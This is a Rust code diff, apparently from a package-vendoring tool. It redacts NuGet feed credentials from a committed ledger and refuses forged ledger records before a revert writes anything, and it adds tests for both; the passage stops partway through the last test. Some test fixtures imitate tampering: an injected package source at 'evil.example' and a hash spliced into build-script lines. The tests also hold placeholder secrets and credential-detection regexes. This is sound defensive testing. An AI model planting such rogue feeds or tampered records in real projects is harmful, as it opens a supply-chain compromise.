@@ -694,6 +694,10 @@ pub async fn vendor_nuget(
     // whole-file pre/post config snapshot. When the config pre-existed it is a
     // `Rewritten` (revert restores `original`); when we created it, an `Added`
     // (revert deletes the file). The mapping record is audit-only.
+    //
+    // The ledger is committed, the config often is not (a CI step writes it
+    // with a feed token): both snapshots go in without the config's
+    // credentials, which the revert takes from the live file again.
     let created_config = config_text.is_none();
     // Both records name the config by its basename (nuget.config always sits
     // at the project root).
@@ -710,8 +714,10 @@ pub async fn vendor_nuget(
             WiringAction::Rewritten
         },
         key: Some(source_key.clone()),
-        original: config_text.as_ref().map(|t| Value::String(t.clone())),
-        new: Some(Value::String(config_edit.new_text.clone())),
+        original: config_text
+            .as_deref()
+            .map(|text| Value::String(redact_config(text).0)),
+        new: Some(Value::String(redact_config(&config_edit.new_text).0)),
     };
     let mapping_record = WiringRecord {
         file: config_rel,
@@ -836,6 +842,22 @@ pub async fn revert_nuget_opts(
             entry.uuid
         ));
     };
+    let Some((id, version)) = parse_nuget_purl(&entry.base_purl) else {
+        return RevertOutcome::failed(format!("not a nuget purl: {}", entry.base_purl));
+    };
+    let package = OwnPackage {
+        id: id.to_string(),
+        version_norm: normalize_nuget_version(&version),
+        source_key: crate::patch::redirect::generation::hosted_pin_name(&entry.uuid),
+    };
+    // SECURITY: state.json is committed and tamper-able, and the records are
+    // replayed one write at a time: every one of them is checked before the
+    // first write, so a refused record leaves the whole entry untouched.
+    for w in &entry.wiring {
+        if let Some(why) = record_refusal(project_root, &package, w) {
+            return RevertOutcome::failed(super::state::refused_record(entry, w, &why));
+        }
+    }
     let mut warnings = Vec::new();
 
     // The lock pin may only go back to the upstream contentHash when
@@ -852,7 +874,7 @@ pub async fn revert_nuget_opts(
         .filter(|w| w.kind == CONFIG_SOURCE_WIRING_KIND)
     {
         if matches!(
-            revert_config_record(project_root, &uuid_dir_rel, w, true).await,
+            revert_config_record(project_root, &uuid_dir_rel, &package, w, true).await,
             Ok(false)
         ) && config_references(project_root, &w.file, &uuid_dir_rel).await
         {
@@ -887,12 +909,14 @@ pub async fn revert_nuget_opts(
                 ));
                 continue;
             }
-            LOCK_WIRING_KIND => revert_lock_record(&project_root.join(&w.file), w, dry_run).await,
+            LOCK_WIRING_KIND => {
+                revert_lock_record(&project_root.join(&w.file), &package, w, dry_run).await
+            }
             // Audit-only: the whole-file config restore lives on the source
             // record, so there is nothing to undo here.
             CONFIG_MAPPING_WIRING_KIND => Ok(true),
             CONFIG_SOURCE_WIRING_KIND => {
-                revert_config_record(project_root, &uuid_dir_rel, w, dry_run).await
+                revert_config_record(project_root, &uuid_dir_rel, &package, w, dry_run).await
             }
             _ => {
                 warnings.push(VendorWarning::new(
@@ -1354,8 +1378,13 @@ fn insert_before_close(
 ///
 /// FRAGMENT-LEVEL: the whole-file `w.original` restore (or, for a config we
 /// created, deleting the file) is only taken on the provably-safe fast path
-/// where the live config is still byte-identical to what we wrote (`w.new`), so
-/// nothing else has changed. Otherwise — a sibling patch added its own
+/// where the live config is still what we wrote (`w.new`), so nothing else
+/// has changed, AND the two snapshots differ by nothing but the lines this
+/// backend adds ([`only_adds_our_lines`]) — the ledger is committed, so its
+/// snapshots are not trusted to say what the config was. Both snapshots are
+/// recorded without the config's credentials ([`redact_config`]): the live
+/// file is compared in the same form and supplies them to the restore.
+/// Otherwise — a sibling patch added its own
 /// `<add>`/`<packageSource>`, or the user hand-edited AFTER vendoring — we
 /// surgically excise ONLY the two elements we authored (our source `<add>` line
 /// and our `<packageSource key="…">` mapping block, both anchored on our
@@ -1367,6 +1396,7 @@ fn insert_before_close(
 async fn revert_config_record(
     project_root: &Path,
     uuid_dir_rel: &str,
+    package: &OwnPackage,
     w: &WiringRecord,
     dry_run: bool,
 ) -> Result<bool, String> {
@@ -1399,29 +1429,44 @@ async fn revert_config_record(
     //     is provably safe (nothing changed since vendoring). A
     //     `core.autocrlf` checkout (Git for Windows' default) hands back
     //     our LF text as CRLF; that is git's encoding, not an edit (#537).
-    let new_matches =
-        matches!(&w.new, Some(Value::String(n)) if eol_eq(n.as_bytes(), live.as_bytes()));
-    if new_matches {
-        if dry_run {
-            return Ok(true);
-        }
-        match &w.original {
+    //     The snapshots are compared and applied without credentials (an
+    //     older ledger's are dropped here too).
+    let (live_plain, credentials) = redact_config(&live);
+    let snapshot = |value: &Option<Value>| match value {
+        Some(Value::String(text)) => Some(redact_config(text).0),
+        _ => None,
+    };
+    let (original, new) = (snapshot(&w.original), snapshot(&w.new));
+    let restored = new
+        .as_deref()
+        .filter(|new| eol_eq(new.as_bytes(), live_plain.as_bytes()))
+        .filter(|new| only_adds_our_lines(original.as_deref(), new, package, uuid_dir_rel))
+        .and_then(|new| match &original {
             // Pre-existed → restore the original, verbatim when the live
             // file still has the line endings we wrote, else spelled in the
             // live file's (the checkout converted it).
-            Some(Value::String(orig)) => {
-                let wrote_lf = matches!(&w.new, Some(Value::String(n)) if *n == live);
-                let restored = if wrote_lf {
-                    orig.clone()
+            Some(original) => {
+                let original = if new == live_plain {
+                    original.clone()
                 } else {
-                    respell(orig, terminator(&live))
+                    respell(original, terminator(&live))
                 };
+                restore_credentials(&original, &credentials).map(Some)
+            }
+            // Created by us → delete the file.
+            None => Some(None),
+        });
+    if let Some(restored) = restored {
+        if dry_run {
+            return Ok(true);
+        }
+        match restored {
+            Some(restored) => {
                 atomic_write_bytes_preserving_mode(&config_path, restored.as_bytes())
                     .await
                     .map_err(|e| format!("failed to restore {}: {e}", config_path.display()))?;
             }
-            // Created by us → delete the file.
-            _ => match crate::utils::fs::remove_file(&config_path).await {
+            None => match crate::utils::fs::remove_file(&config_path).await {
                 Ok(()) => {}
                 Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                 Err(e) => return Err(format!("failed to remove {}: {e}", config_path.display())),
@@ -1503,6 +1548,331 @@ fn excise_source_mapping(config: &str, source_key: &str, nl: &str) -> Option<Str
     let rel_close = config[open_at..].find(&close)?;
     let end = open_at + rel_close + close.len();
     Some(config[open_at..end].to_string())
+}
+
+// ── what a ledger record may say ────────────────────────────────────────────────
+
+/// The package a ledger entry vendors, for checking its records.
+struct OwnPackage {
+    id: String,
+    /// [`normalize_nuget_version`] of the vendored version.
+    version_norm: String,
+    /// The key of this patch's source in `nuget.config`.
+    source_key: String,
+}
+
+/// Why a record is not one [`vendor_nuget`] writes for `package`. The
+/// ledger is committed, so a checkout can carry any ledger, and the revert
+/// replays these records as writes: the config record deletes or rewrites
+/// the file it names and excises the source its key names, and the lock
+/// record swaps one quoted value for another wherever it stands in the file
+/// it names. So the config record names a NuGet config and this patch's own
+/// source, and the lock record names a NuGet lock and holds two
+/// contentHashes.
+fn record_refusal(project_root: &Path, package: &OwnPackage, w: &WiringRecord) -> Option<String> {
+    let unsafe_path = || Some(format!("names an unsafe wiring file path {:?}", w.file));
+    match w.kind.as_str() {
+        CONFIG_SOURCE_WIRING_KIND => {
+            if !is_safe_single_segment(&w.file) {
+                return unsafe_path();
+            }
+            if !crate::patch::redirect::NUGET_CONFIG_FILE_NAMES.contains(&w.file.as_str()) {
+                return Some("names a file that is not the project's NuGet config".to_string());
+            }
+            w.key
+                .as_deref()
+                .is_some_and(|key| key != package.source_key)
+                .then(|| {
+                    format!(
+                        "names a package source that is not this patch's ({})",
+                        package.source_key
+                    )
+                })
+        }
+        LOCK_WIRING_KIND => {
+            if !is_safe_multi_segment(&w.file) {
+                return unsafe_path();
+            }
+            let hashes = [&w.original, &w.new]
+                .into_iter()
+                .flatten()
+                .all(|value| value.as_str().is_some_and(is_content_hash));
+            if !hashes {
+                return Some("swaps a value that is not a package contentHash".to_string());
+            }
+            ledger_lock_file_refusal(project_root, &w.file)
+        }
+        _ => None,
+    }
+}
+
+/// A `packages.lock.json` contentHash: the base64 of a digest. Nothing in
+/// it can end the JSON string it is spliced into.
+fn is_content_hash(value: &str) -> bool {
+    (1..=128).contains(&value.len())
+        && value
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_'))
+}
+
+/// Why `file` is not a lock a `nuget_lock_entry` record names: vendoring
+/// pins the locks the projects under the root restore into
+/// ([`super::nuget_config::governed_locks_on_disk`]) — a
+/// `packages.lock.json` or `packages.<Project>.lock.json` beside a project
+/// (never in a hidden directory, which the project walk skips), or the
+/// file a project's `NuGetLockFilePath` names.
+pub(super) fn ledger_lock_file_refusal(project_root: &Path, file: &str) -> Option<String> {
+    let name = file.rsplit('/').next().unwrap_or(file).to_ascii_lowercase();
+    let named =
+        name == PACKAGES_LOCK || (name.starts_with("packages.") && name.ends_with(".lock.json"));
+    let hidden = file.split('/').any(|level| level.starts_with('.'));
+    if named && !hidden {
+        return None;
+    }
+    let governed = super::nuget_config::governed_locks_on_disk(project_root)
+        .map(|governed| governed.locks)
+        .unwrap_or_default();
+    (!governed.iter().any(|rel| rel == file)).then(|| {
+        "names a file that is not a NuGet lock a project under the root restores into".to_string()
+    })
+}
+
+/// What stands in the ledger for a credential of `nuget.config`.
+const REDACTED: &str = "socket-patch:redacted";
+
+/// The credential-bearing spans of a `nuget.config`: everything inside
+/// `<packageSourceCredentials>` and `<apikeys>`, the `value` of any `<add>`
+/// whose key mentions a password (`http_proxy.password`), and the
+/// `user:secret` of a URL.
+fn credential_spans(text: &str) -> Vec<std::ops::Range<usize>> {
+    use regex::Regex;
+    use std::sync::LazyLock;
+    static SECTION: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(
+            r"(?is)(<(?:packageSourceCredentials|apikeys)\b[^>]*>)(.*?)</(?:packageSourceCredentials|apikeys)\s*>",
+        )
+        .expect("valid regex")
+    });
+    static ADD: LazyLock<Regex> =
+        LazyLock::new(|| Regex::new(r"(?is)<add\b[^<>]*>").expect("valid regex"));
+    static PASSWORD_KEY: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r#"(?is)\bkey\s*=\s*(?:"[^"]*password[^"]*"|'[^']*password[^']*')"#)
+            .expect("valid regex")
+    });
+    static VALUE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r#"(?is)\bvalue\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("valid regex")
+    });
+    static USERINFO: LazyLock<Regex> =
+        LazyLock::new(|| Regex::new(r#"://([^/\s"'<>@]+)@"#).expect("valid regex"));
+    // Most configs hold none: one pass says so.
+    static ANY: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r"(?i)@|password|packageSourceCredentials|apikeys").expect("valid regex")
+    });
+    if !ANY.is_match(text) {
+        return Vec::new();
+    }
+
+    let mut spans: Vec<std::ops::Range<usize>> = Vec::new();
+    spans.extend(
+        SECTION
+            .captures_iter(text)
+            // A self-closing section holds nothing.
+            .filter(|section| !section[1].ends_with("/>"))
+            .filter_map(|section| section.get(2))
+            .map(|inner| inner.range()),
+    );
+    for add in ADD.find_iter(text) {
+        if !PASSWORD_KEY.is_match(add.as_str()) {
+            continue;
+        }
+        let value = VALUE
+            .captures(add.as_str())
+            .and_then(|value| value.get(1).or_else(|| value.get(2)));
+        spans.extend(value.map(|value| add.start() + value.start()..add.start() + value.end()));
+    }
+    spans.extend(
+        USERINFO
+            .captures_iter(text)
+            .filter_map(|url| url.get(1))
+            .map(|userinfo| userinfo.range()),
+    );
+    spans.retain(|span| !span.is_empty());
+    spans.sort_by_key(|span| (span.start, std::cmp::Reverse(span.end)));
+    // Outermost first: a span inside one already taken is part of it.
+    let mut end = 0;
+    spans.retain(|span| {
+        let outer = span.start >= end;
+        if outer {
+            end = span.end;
+        }
+        outer
+    });
+    spans
+}
+
+/// `text` with each credential replaced by [`REDACTED`], and the
+/// credentials in document order. The ledger only ever holds the first
+/// half; [`restore_credentials`] puts the second back.
+fn redact_config(text: &str) -> (String, Vec<&str>) {
+    let mut redacted = String::with_capacity(text.len());
+    let mut credentials = Vec::new();
+    let mut at = 0;
+    for span in credential_spans(text) {
+        redacted.push_str(&text[at..span.start]);
+        redacted.push_str(REDACTED);
+        credentials.push(&text[span.clone()]);
+        at = span.end;
+    }
+    redacted.push_str(&text[at..]);
+    (redacted, credentials)
+}
+
+/// Drop the credentials from every `nuget.config` snapshot of a serialized
+/// ledger, on its way to disk: an entry recorded before the snapshots were
+/// redacted (and carried through this run untouched) stops holding them
+/// the next time the ledger is written.
+pub(super) fn redact_ledger(ledger: &mut Value) {
+    for record in super::ledger_snapshots::records_mut(ledger) {
+        if record.get("kind").and_then(Value::as_str) != Some(CONFIG_SOURCE_WIRING_KIND) {
+            continue;
+        }
+        for snapshot in ["original", "new"] {
+            if let Some(Value::String(text)) = record.get_mut(snapshot) {
+                let redacted = redact_config(text).0;
+                *text = redacted;
+            }
+        }
+    }
+}
+
+/// A [`redact_config`] text with `credentials` back in place, or `None`
+/// when it does not hold exactly one [`REDACTED`] for each.
+fn restore_credentials(redacted: &str, credentials: &[&str]) -> Option<String> {
+    let mut parts = redacted.split(REDACTED);
+    let mut restored = parts.next()?.to_string();
+    let mut credentials = credentials.iter();
+    for part in parts {
+        restored.push_str(credentials.next()?);
+        restored.push_str(part);
+    }
+    credentials.next().is_none().then_some(restored)
+}
+
+/// Whether `new` is `original` with nothing but lines this backend writes
+/// added to it ([`build_config_edit_with`]): this patch's source and
+/// mapping, and the scaffold a config without one gets — a
+/// `<packageSources>` or `<packageSourceMapping>` section, the nuget.org
+/// seed, and a catch-all mapping for every source there was. `original` is
+/// `None` for a config vendoring created, whose every line is such a line.
+///
+/// The whole-file restore puts `original` back, so this is what makes it
+/// the undo of the vendoring and nothing more: a ledger whose snapshots
+/// differ in any other way (a source it adds or drops, a setting, a
+/// pattern) is not followed. The one line the edit changes in place and
+/// this still recognizes is an empty self-closing section on a line of its
+/// own, opened to take the scaffold; any other in-place change (a
+/// competing pattern set aside, a section sharing its line) is undone
+/// element by element instead.
+fn only_adds_our_lines(
+    original: Option<&str>,
+    new: &str,
+    package: &OwnPackage,
+    uuid_dir_rel: &str,
+) -> bool {
+    let sources: Vec<String> = match original {
+        None => Vec::new(),
+        Some(text) => match crate::formats::nuget::parse_config(text) {
+            Some(config) => config.sources.into_iter().map(|(key, _)| key).collect(),
+            None => return false,
+        },
+    };
+    // A section is ours to fill with scaffold when the config had none, or
+    // had it empty and self-closing (opened in place below).
+    let had =
+        |section: &str| original.is_some_and(|text| text.to_ascii_lowercase().contains(section));
+    let mut created_sources = !had("packagesources");
+    let mut created_mapping = !had("packagesourcemapping");
+    let our_source = format!(
+        "<add key=\"{}\" value=\"{uuid_dir_rel}\" />",
+        package.source_key
+    );
+    let seed = format!("<add key=\"{NUGET_ORG_SOURCE_KEY}\" value=\"{NUGET_ORG_SOURCE_URL}\" />");
+    let our_pattern = format!("<package pattern=\"{}\" />", package.id);
+    let kept: Vec<&str> = original
+        .map(|text| text.lines().collect())
+        .unwrap_or_default();
+    let mut next = 0;
+    // What the added lines hold, judged once the whole file is read (a
+    // section opened further down decides about a line above it).
+    let (mut wired, mut seeded, mut sources_scaffold, mut mapping_scaffold) =
+        (false, false, false, false);
+    let mut catch_alls: Vec<&str> = Vec::new();
+    for line in new.lines() {
+        if kept.get(next) == Some(&line) {
+            next += 1;
+            continue;
+        }
+        // An empty self-closing section, opened where it stood.
+        let opened = kept.get(next).and_then(|kept| {
+            let head = kept.trim_end().strip_suffix("/>")?.trim_end();
+            (line.trim_end() == format!("{head}>")).then_some(head.trim_start())
+        });
+        match opened {
+            Some("<packageSources") => created_sources = true,
+            Some("<packageSourceMapping") => created_mapping = true,
+            _ => {}
+        }
+        if matches!(opened, Some("<packageSources" | "<packageSourceMapping")) {
+            next += 1;
+            continue;
+        }
+        let line = line.trim();
+        if line == our_source {
+            wired = true;
+        } else if line == seed {
+            seeded = true;
+        } else if matches!(line, "<packageSources>" | "</packageSources>") {
+            sources_scaffold = true;
+        } else if matches!(
+            line,
+            "<packageSourceMapping>" | "</packageSourceMapping>" | "<package pattern=\"*\" />"
+        ) {
+            mapping_scaffold = true;
+        } else if let Some(key) = line
+            .strip_prefix("<packageSource key=\"")
+            .and_then(|rest| rest.strip_suffix("\">"))
+        {
+            if key.contains(['"', '<', '>']) {
+                return false;
+            }
+            if key != package.source_key {
+                catch_alls.push(key);
+            }
+        } else if line != our_pattern
+            && line != "</packageSource>"
+            && !(original.is_none()
+                && matches!(
+                    line,
+                    "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
+                        | "<configuration>"
+                        | "</configuration>"
+                ))
+        {
+            return false;
+        }
+    }
+    // The scaffold belongs to sections created here: the nuget.org seed to
+    // a config that had no source, and a catch-all mapping to every source
+    // the config had (one that leaves a source out is somebody else's).
+    next == kept.len()
+        && wired
+        && (!sources_scaffold || created_sources)
+        && ((!mapping_scaffold && catch_alls.is_empty()) || created_mapping)
+        && (!seeded || (sources.is_empty() && created_mapping))
+        && (catch_alls.is_empty()
+            || sources.iter().all(|key| {
+                catch_alls.contains(&crate::formats::nuget::xml_attribute(key).as_str())
+            }))
 }
 
 // ── packages.lock.json editing ──────────────────────────────────────────────────
@@ -1599,6 +1969,7 @@ fn lock_pinned(text: &str, id: &str, version_norm: &str, expected_hash: &str) ->
 /// (neither our value nor the original is present); `Err` = I/O failure.
 async fn revert_lock_record(
     lock_path: &Path,
+    package: &OwnPackage,
     w: &WiringRecord,
     dry_run: bool,
 ) -> Result<bool, String> {
@@ -1618,6 +1989,16 @@ async fn revert_lock_record(
         // Our value is gone. If the original is already present, a prior revert
         // (shared across framework entries) restored it — done; else drift.
         return Ok(text.contains(&format!("\"{orig}\"")));
+    }
+    // The value is swapped by text wherever it stands, so it must be what
+    // the record says it is: the contentHash this package is pinned at. A
+    // file where it is anything else is not a lock this patch pinned.
+    let pinned = lock_value(&text).is_ok_and(|doc| {
+        locked_at(&doc, &package.id, &package.version_norm)
+            .any(|entry| entry.content_hash == Some(ours.as_str()))
+    });
+    if !pinned {
+        return Ok(false);
     }
     if dry_run {
         return Ok(true);
@@ -4973,6 +5354,15 @@ mod tests {
 
     // ── revert_lock_record pure edges ──────────────────────────────────────
 
+    /// The package the fixture lock and config records belong to.
+    fn own_package() -> OwnPackage {
+        OwnPackage {
+            id: "Newtonsoft.Json".to_string(),
+            version_norm: "13.0.3".to_string(),
+            source_key: source_key(),
+        }
+    }
+
     fn lock_wiring(original: Option<&str>, new: Option<&str>) -> WiringRecord {
         WiringRecord {
             file: PACKAGES_LOCK.to_string(),
@@ -4992,11 +5382,16 @@ mod tests {
         tokio::fs::write(&lock_path, &text).await.unwrap();
         // original missing → drift, and the file is never touched.
         let w = lock_wiring(None, Some("OURS=="));
-        assert!(!revert_lock_record(&lock_path, &w, false).await.unwrap());
+        let own = own_package();
+        assert!(!revert_lock_record(&lock_path, &own, &w, false)
+            .await
+            .unwrap());
         assert_eq!(tokio::fs::read_to_string(&lock_path).await.unwrap(), text);
         // new missing → same drift.
         let w = lock_wiring(Some("OLD=="), None);
-        assert!(!revert_lock_record(&lock_path, &w, false).await.unwrap());
+        assert!(!revert_lock_record(&lock_path, &own, &w, false)
+            .await
+            .unwrap());
         assert_eq!(tokio::fs::read_to_string(&lock_path).await.unwrap(), text);
     }
 
@@ -5007,7 +5402,9 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let missing = dir.path().join("no-such-lock.json");
         let w = lock_wiring(Some("SAME=="), Some("SAME=="));
-        assert!(revert_lock_record(&missing, &w, false).await.unwrap());
+        assert!(revert_lock_record(&missing, &own_package(), &w, false)
+            .await
+            .unwrap());
         assert!(!missing.exists());
     }
 
@@ -5016,11 +5413,14 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let lock_path = dir.path().join(PACKAGES_LOCK);
         let w = lock_wiring(Some("OLD=="), Some("NEW=="));
+        let own = own_package();
         // Ours gone but the original is present: a prior revert already
         // restored it (shared hash across framework entries) — done.
         let restored = lock_json("OLD==");
         tokio::fs::write(&lock_path, &restored).await.unwrap();
-        assert!(revert_lock_record(&lock_path, &w, false).await.unwrap());
+        assert!(revert_lock_record(&lock_path, &own, &w, false)
+            .await
+            .unwrap());
         assert_eq!(
             tokio::fs::read_to_string(&lock_path).await.unwrap(),
             restored
@@ -5028,14 +5428,50 @@ mod tests {
         // Neither value present: drift, file untouched.
         let foreign = lock_json("SOMETHINGELSE==");
         tokio::fs::write(&lock_path, &foreign).await.unwrap();
-        assert!(!revert_lock_record(&lock_path, &w, false).await.unwrap());
+        assert!(!revert_lock_record(&lock_path, &own, &w, false)
+            .await
+            .unwrap());
         assert_eq!(
             tokio::fs::read_to_string(&lock_path).await.unwrap(),
             foreign
         );
         // A missing lock file is drift too, not an error.
         tokio::fs::remove_file(&lock_path).await.unwrap();
-        assert!(!revert_lock_record(&lock_path, &w, false).await.unwrap());
+        assert!(!revert_lock_record(&lock_path, &own, &w, false)
+            .await
+            .unwrap());
+    }
+
+    /// The pin is swapped by text, so the value must be the contentHash the
+    /// lock pins THIS package at: the same quoted string anywhere else — in
+    /// another package's entry, in a file that is no lock — is left alone.
+    #[tokio::test]
+    async fn revert_lock_record_swaps_only_this_packages_content_hash() {
+        let dir = tempfile::tempdir().unwrap();
+        let lock_path = dir.path().join(PACKAGES_LOCK);
+        let w = lock_wiring(Some("OLD=="), Some("NEW=="));
+        let own = own_package();
+        for text in [
+            lock_json("NEW==").replace("Newtonsoft.Json", "Other.Package"),
+            "{\"scripts\": {\"build\": \"NEW==\"}}\n".to_string(),
+            "run: \"NEW==\"\n".to_string(),
+        ] {
+            tokio::fs::write(&lock_path, &text).await.unwrap();
+            assert!(!revert_lock_record(&lock_path, &own, &w, false)
+                .await
+                .unwrap());
+            assert_eq!(tokio::fs::read_to_string(&lock_path).await.unwrap(), text);
+        }
+        tokio::fs::write(&lock_path, lock_json("NEW=="))
+            .await
+            .unwrap();
+        assert!(revert_lock_record(&lock_path, &own, &w, false)
+            .await
+            .unwrap());
+        assert_eq!(
+            tokio::fs::read_to_string(&lock_path).await.unwrap(),
+            lock_json("OLD==")
+        );
     }
 
     // ── unwind of a CREATED config ─────────────────────────────────────────
@@ -5773,7 +6209,7 @@ mod tests {
                 .unwrap();
             return; // modes ignored (running as root) — nothing to test
         }
-        let res = revert_config_record(root, &uuid_dir_rel, &w, false).await;
+        let res = revert_config_record(root, &uuid_dir_rel, &own_package(), &w, false).await;
         tokio::fs::set_permissions(root, std::fs::Permissions::from_mode(0o755))
             .await
             .unwrap();
@@ -6054,5 +6490,373 @@ mod tests {
         };
         assert_eq!(code, "vendor_prebuilt_required");
         assert!(!root.join(".socket").exists(), "nothing written");
+    }
+
+    // ── what the ledger holds of nuget.config ──────────────────────────────
+
+    const CONFIG_WITH_CREDENTIALS: &str = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\
+        <configuration>\n\
+        \x20 <packageSources>\n\
+        \x20   <add key=\"nuget.org\" value=\"https://api.nuget.org/v3/index.json\" />\n\
+        \x20   <add key=\"corp\" value=\"https://ci-user:url-TOKEN@nuget.corp.example/v3/index.json\" />\n\
+        \x20 </packageSources>\n\
+        \x20 <packageSourceCredentials>\n\
+        \x20   <corp>\n\
+        \x20     <add key=\"Username\" value=\"ci-user\" />\n\
+        \x20     <add key=\"ClearTextPassword\" value=\"feed-TOKEN\" />\n\
+        \x20   </corp>\n\
+        \x20 </packageSourceCredentials>\n\
+        \x20 <config>\n\
+        \x20   <add value=\"proxy-PASSWORD\" key=\"http_proxy.password\" />\n\
+        \x20   <add key=\"globalPackagesFolder\" value=\"packages\" />\n\
+        \x20 </config>\n\
+        \x20 <apikeys>\n\
+        \x20   <add key=\"https://nuget.corp.example\" value=\"push-KEY\" />\n\
+        \x20 </apikeys>\n\
+        </configuration>\n";
+
+    /// Every credential a config can hold is taken out of what the ledger
+    /// records, and the same text goes back in around them.
+    #[test]
+    fn redaction_drops_every_credential_and_restores_them() {
+        let (redacted, credentials) = redact_config(CONFIG_WITH_CREDENTIALS);
+        for secret in [
+            "url-TOKEN",
+            "feed-TOKEN",
+            "proxy-PASSWORD",
+            "push-KEY",
+            "ci-user",
+        ] {
+            assert!(!redacted.contains(secret), "{secret} survives: {redacted}");
+        }
+        assert_eq!(credentials.len(), 4, "{credentials:?}");
+        // What is not a credential stays: the sources, the settings.
+        assert!(redacted.contains("nuget.corp.example/v3/index.json"));
+        assert!(redacted.contains("globalPackagesFolder"));
+        assert_eq!(
+            restore_credentials(&redacted, &credentials).as_deref(),
+            Some(CONFIG_WITH_CREDENTIALS)
+        );
+        // Redacting twice changes nothing more, and a config without
+        // credentials is recorded as it is.
+        assert_eq!(redact_config(&redacted).0, redacted);
+        let plain = "<configuration>\n  <packageSources />\n  <apikeys />\n</configuration>\n";
+        assert_eq!(redact_config(plain), (plain.to_string(), Vec::new()));
+        // A count that does not match is no restore at all.
+        assert_eq!(restore_credentials(&redacted, &credentials[..3]), None);
+        assert_eq!(restore_credentials(plain, &credentials), None);
+    }
+
+    /// #VN-S1: vendoring a project whose config carries credentials records
+    /// none of them, and the revert still restores the config byte for
+    /// byte.
+    #[tokio::test]
+    async fn config_credentials_never_reach_the_ledger_and_revert_is_exact() {
+        let (dir, blobs, installed, record) = fixture(true, Some(CONFIG_WITH_CREDENTIALS)).await;
+        let root = dir.path();
+        let (_r, entry, _w) =
+            unwrap_done(run_vendor(root, &blobs, &installed, &record, false).await);
+        let entry = entry.unwrap();
+        let ledger = serde_json::to_string(&entry).unwrap();
+        for secret in [
+            "url-TOKEN",
+            "feed-TOKEN",
+            "proxy-PASSWORD",
+            "push-KEY",
+            "ci-user",
+        ] {
+            assert!(!ledger.contains(secret), "the ledger entry holds {secret}");
+        }
+        let wired = tokio::fs::read_to_string(root.join("nuget.config"))
+            .await
+            .unwrap();
+        assert!(wired.contains("feed-TOKEN") && wired.contains(&source_key()));
+
+        let outcome = revert_nuget(&entry, root, false).await;
+        assert!(outcome.success, "{:?}", outcome.error);
+        assert!(outcome.warnings.is_empty(), "{:?}", outcome.warnings);
+        assert_eq!(
+            tokio::fs::read_to_string(root.join("nuget.config"))
+                .await
+                .unwrap(),
+            CONFIG_WITH_CREDENTIALS
+        );
+    }
+
+    /// Whoever recorded them: a ledger entry that still carries a config's
+    /// credentials (one written before they were dropped) loses them the
+    /// next time the ledger is saved, and still loads.
+    #[tokio::test]
+    async fn a_saved_ledger_holds_no_config_credentials() {
+        let dir = tempfile::tempdir().unwrap();
+        let wired = CONFIG_WITH_CREDENTIALS.replace(
+            "  </packageSources>",
+            &format!(
+                "    <add key=\"{}\" value=\".socket/vendor/nuget/{UUID}\" />\n  </packageSources>",
+                source_key()
+            ),
+        );
+        let record = WiringRecord {
+            file: "nuget.config".to_string(),
+            kind: CONFIG_SOURCE_WIRING_KIND.to_string(),
+            action: WiringAction::Rewritten,
+            key: Some(source_key()),
+            original: Some(Value::String(CONFIG_WITH_CREDENTIALS.to_string())),
+            new: Some(Value::String(wired.clone())),
+        };
+        let mut state = crate::vendor::state::VendorState::new();
+        state
+            .entries
+            .insert(PURL.to_string(), entry_with_wiring(UUID, vec![record]));
+        crate::vendor::state::save_state(dir.path(), &state)
+            .await
+            .unwrap();
+
+        let saved = tokio::fs::read_to_string(dir.path().join(".socket/vendor/state.json"))
+            .await
+            .unwrap();
+        for secret in [
+            "url-TOKEN",
+            "feed-TOKEN",
+            "proxy-PASSWORD",
+            "push-KEY",
+            "ci-user",
+        ] {
+            assert!(!saved.contains(secret), "the saved ledger holds {secret}");
+        }
+        let loaded = crate::vendor::state::load_state(dir.path()).await.unwrap();
+        let record = &loaded.entries[PURL].wiring[0];
+        assert_eq!(
+            record.original,
+            Some(Value::String(redact_config(CONFIG_WITH_CREDENTIALS).0))
+        );
+        assert_eq!(record.new, Some(Value::String(redact_config(&wired).0)));
+    }
+
+    /// A ledger written before the credentials were dropped (whole-file
+    /// snapshots, credentials and all) still reverts byte for byte.
+    #[tokio::test]
+    async fn an_unredacted_ledger_still_reverts_exactly() {
+        let (dir, blobs, installed, record) = fixture(true, Some(CONFIG_WITH_CREDENTIALS)).await;
+        let root = dir.path();
+        let (_r, entry, _w) =
+            unwrap_done(run_vendor(root, &blobs, &installed, &record, false).await);
+        let mut entry = entry.unwrap();
+        let wired = tokio::fs::read_to_string(root.join("nuget.config"))
+            .await
+            .unwrap();
+        entry.wiring[0].original = Some(Value::String(CONFIG_WITH_CREDENTIALS.to_string()));
+        entry.wiring[0].new = Some(Value::String(wired));
+
+        let outcome = revert_nuget(&entry, root, false).await;
+        assert!(outcome.success, "{:?}", outcome.error);
+        assert_eq!(
+            tokio::fs::read_to_string(root.join("nuget.config"))
+                .await
+                .unwrap(),
+            CONFIG_WITH_CREDENTIALS
+        );
+    }
+
+    /// The whole-file restore is taken only for snapshots that differ by
+    /// the lines this backend adds: any other pair is undone element by
+    /// element, and the recorded text is never written.
+    #[tokio::test]
+    async fn config_snapshots_that_differ_otherwise_are_never_written() {
+        let orig_cfg = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\
+                        <configuration>\n\
+                        \x20 <packageSources>\n\
+                        \x20   <add key=\"nuget.org\" value=\"https://api.nuget.org/v3/index.json\" />\n\
+                        \x20   <add key=\"corp\" value=\"https://nuget.corp.example/v3/index.json\" />\n\
+                        \x20 </packageSources>\n\
+                        </configuration>\n";
+        for evil in [
+            // A source the user never had.
+            orig_cfg.replace(
+                "  </packageSources>",
+                "    <add key=\"evil\" value=\"https://evil.example/v3/index.json\" />\n  </packageSources>",
+            ),
+            // The user's own source gone.
+            orig_cfg.replace(
+                "    <add key=\"corp\" value=\"https://nuget.corp.example/v3/index.json\" />\n",
+                "",
+            ),
+            "<configuration><config><add key=\"x\" value=\"y\" /></config></configuration>\n"
+                .to_string(),
+        ] {
